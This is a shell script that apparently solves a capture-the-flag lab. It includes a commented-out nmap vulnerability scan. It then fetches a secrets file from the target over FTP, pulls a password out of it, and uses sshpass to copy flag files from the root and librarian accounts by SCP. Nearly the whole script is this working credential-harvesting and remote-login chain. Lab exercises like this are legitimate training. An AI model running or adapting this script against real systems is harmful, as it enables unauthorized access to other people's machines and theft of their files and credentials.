#/bin/sh

# Retrieve absolute path to this script
script=$(readlink -f $0)
scriptpath=`dirname $script`

# Define host IP ( the machine to attack ) and remote IP ( the machine which supports the attack )
target_ip="10.10.7.170"
attack_ip="10.10.178.169"

# Prepare environment
mkdir /work/

# Scan all ports using nmap
# nmap --script vuln -sC -sV -p- ${target_ip} > /work/nmap-results.txt

# Gather secrets using ftp
ftp -inv ${target_ip} < ${scriptpath}/ftp-command.txt
mv /work/'secret.txt'$'\r' /work/secret.txt
export password=$(sed -n 's/^password: //p' /work/secret.txt)
echo $password

# Use ssh to capture the flag
apt install sshpass
sshpass -p ${password} scp root@${target_ip}:flag.txt /work/flag-root.txt 
sshpass -p ${password} scp root@${target_ip}:/home/librarian/flag.txt /work/flag-librarian.txt 